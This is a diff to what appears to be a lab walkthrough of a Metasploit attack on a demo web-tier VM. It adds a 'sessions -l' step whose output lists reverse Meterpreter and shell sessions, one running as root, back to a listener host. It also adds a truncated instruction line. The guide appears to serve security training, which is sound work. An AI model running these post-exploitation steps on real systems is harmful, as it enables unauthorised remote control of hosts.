@@ -627,8 +627,22 @@ msf5 post(multi/manage/shell_to_meterpreter) > exploit
 [*] Command stager progress: 100.00% (773/773 bytes)
 [*] Post module execution completed
 ```
+    * Type **use multi/manage/shell_to_meterpreter** to sele
+
 6. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
-    * Type **sysinfo** to learn more about the running OS
+    * Type **sessions -l** to see all established sessions
+```console
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                                                         Connection
+  --  ----  ----                   -----------                                                         ----------
+  1         meterpreter php/linux  www-data (33) @ 273e1700c5be                                        10.114.209.151:4444 -> 192.168.10.101:52496 (192.168.10.101)
+  2         shell x64/linux                                                                            10.114.209.151:4445 -> 10.114.209.148:50665 (192.168.20.100)
+  3         meterpreter x86/linux  no-user @ fd5e509d541b (uid=0, gid=0, euid=0, egid=0) @ 172.19.0.2  10.114.209.151:8081 -> 10.114.209.148:59526 (172.19.0.2)
+```
 
 ```console
 meterpreter > sysinfo
